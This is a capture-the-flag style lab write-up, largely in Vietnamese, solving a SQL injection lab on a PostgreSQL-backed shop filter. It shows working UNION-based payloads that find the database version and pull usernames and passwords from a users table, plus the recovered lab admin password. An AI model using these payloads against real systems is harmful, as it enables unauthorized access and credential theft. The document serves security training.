# SQL injection UNION attack, retrieving multiple values in a single column

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

    ![](<Images/SQL injection UNION attack, retrieving multiple values in a single column 0.png>)

## Solution


![](<Images/SQL injection UNION attack, retrieving multiple values in a single column 1.png>)

Sau khi truy cập vào trang web, tôi đã chọn thử danh mục `Lifestyle` và tìm được một untrusted data trong url

```text
filter?category=Lifestyle
```

Tôi bắt lại traffic đó trong Burp và thử thêm một dấu nháy đơn `'` vào payload

![alt text](<Images/SQL injection UNION attack, retrieving multiple values in a single column 2.png>)

Đúng như tôi mong đợi, sau khi request được gửi, server đã trả về lỗi

```text
Internal Server Error
```

Sau khi biết có tồn tại lỗ hổng SQLi, tôi cần biết truy vấn hiện tại có bao nhiêu cột để thực hiện `UNION` Attack

After using [ORDER BY combined with Binary Search](./Find%20the%20number%20of%20columns%20using%20ORDER%20BY%20and%20binary%20search%20principles.md), I found that the current query has 2 columns.

Tiếp đến, tôi cần biết phiên bản SQL được sử dụng

```sql
Lifestyle' UNION SELECT NULL, version() -- -
```

Và tôi có kết quả

```text
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```
Note: Vì tôi vẫn giữ payload `Lifestyle'` nên kết quả trả ra không được clean cho lắm (hình dưới)

![alt text](<Images/SQL injection UNION attack, retrieving multiple values in a single column 3.png>)

Và như đề bài đã cho, chúng ta sẽ khai thác bảng `users` và 2 cột `username`, `password` để lấy được tài khoản admin

Tôi sử dụng payload

```sql
Lifestyle' UNION SELECT username, password FROM users -- -
```

Nhưng chờ đã, sau khi gửi payload trên, server lại trả về lỗi :( !

```text
Internal Server Error
```

Có vẻ như cột thứ nhất của truy vấn không phải kiểu dữ liệu `STRING`. Vì vậy tôi cần nối `username` và `password` và hiển thị ở cột thứ 2

Và vì backend đang sử dụng `PostgreSQL 12.22`, tôi có payload

```sql
Lifestyle' UNION SELECT NULL, username ||'-->'|| password FROM users -- -
```

Và thật may mắn, payload đã hoạt động

![](<Images/SQL injection UNION attack, retrieving multiple values in a single column 6.png>)

Chúng ta có thông tin tài khaonr của `admin`

```text
username : administrator
password : snlojy7p7e06gfm7lmd6
```

Đăng nhập vào tài khoản và lab đã được giải

![alt text](<Images/SQL injection UNION attack, retrieving multiple values in a single column 7.png>)

![alt text](<Images/SQL injection UNION attack, retrieving multiple values in a single column 8.png>)